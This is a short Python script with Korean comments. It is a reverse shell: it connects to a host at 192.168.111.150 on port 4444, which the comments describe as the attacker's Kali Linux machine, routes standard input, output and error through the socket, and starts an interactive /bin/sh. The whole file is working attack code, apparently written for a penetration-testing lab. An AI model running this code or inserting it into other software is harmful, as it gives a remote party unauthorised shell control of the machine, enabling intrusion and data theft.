import socket
import subprocess
import os

# 공격자(칼리 리눅스)의 IP와 포트로 강제 연결을 꽂는 코드
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.111.150 ", 4444))  # 칼리 IP와 포트 입력

os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

p = subprocess.call(["/bin/sh", "-i"])